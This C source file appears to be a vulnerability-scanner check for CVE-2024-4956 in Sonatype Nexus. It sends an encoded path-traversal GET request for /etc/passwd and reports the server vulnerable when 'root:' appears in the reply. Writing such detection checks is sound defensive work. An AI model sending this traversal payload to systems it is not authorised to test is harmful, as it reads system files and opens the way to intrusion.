/* http-vuln-cve2024-4956-4 - Sonatype Nexus path traversal probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/repository/..%2f..%2f..%2f..%2fetc%2fpasswd", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2024-4956-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "root:")) {
        ar_out(ctx, "VULNERABLE: /repository/..%2f..%2f..%2f..%2fetc%2fpasswd [%d] (CVE-2024-4956)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2024-4956 (/repository/..%2f..%2f..%2f..%2fetc%2fpasswd [%d])", ar_http_status(resp));
    }
    return 0;
}
